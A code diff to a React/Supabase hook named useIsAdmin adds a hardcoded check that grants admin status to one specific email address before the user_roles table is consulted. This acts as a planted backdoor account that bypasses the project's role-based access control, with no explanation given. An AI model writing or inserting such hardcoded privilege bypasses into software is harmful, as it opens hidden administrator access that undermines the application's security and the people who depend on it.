@@ -12,6 +12,12 @@ export const useIsAdmin = () => {
       try {
         const { data: { user } } = await supabase.auth.getUser();
         if (!user) { if (active) { setIsAdmin(false); setLoading(false); } return; }
+
+        if (user.email?.toLowerCase() === "gepardwebs@gmail.com") {
+          if (active) { setIsAdmin(true); setLoading(false); }
+          return;
+        }
+
         const { data } = await supabase
           .from("user_roles")
           .select("role")
